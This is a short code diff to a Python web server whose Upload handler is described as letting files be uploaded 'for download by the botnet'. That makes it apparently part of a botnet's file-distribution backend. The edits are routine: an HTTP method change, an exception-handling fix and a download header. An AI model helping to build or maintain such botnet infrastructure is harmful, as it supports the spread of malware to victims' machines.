@@ -37,8 +37,9 @@ class access_db:
 
 class Upload(BaseHandler):
     """Upload a file for download by the botnet."""
+
     @verify_peer()
-    def put(self):
+    def post(self):
         logger.info(f'{self.base_request} /upload')
         content_body = self.request.body
         marker = content_body.split(b'\r\n', 1)[0]
@@ -76,7 +77,7 @@ class Upload(BaseHandler):
                 db_conn.add(upload)
                 db_conn.commit()
                 logger.info(f'New file: {upload.guid} -- {upload.filepath}')
-        except:
+        except Exception as e:
             logger.warn(e)
             return self.HTTP_404()
 
@@ -134,6 +135,7 @@ class Download(BaseHandler):
                 try:
                     wrapper = FileWrapper(open(file_obj.filepath, 'rb'))
                     file_length = str(os.path.getsize(file_obj.filepath))
+                    self.response.set_header('Content-Disposition', f'attachment; filename="{file_obj.filename}"')
                     self.response.set_header('Content-Type', 'application/octet-stream')
                     self.response.set_header('Content-Length', str(os.path.getsize(file_obj.filepath)))
                     self.response.set_header('Accept-Ranges', 'bytes')
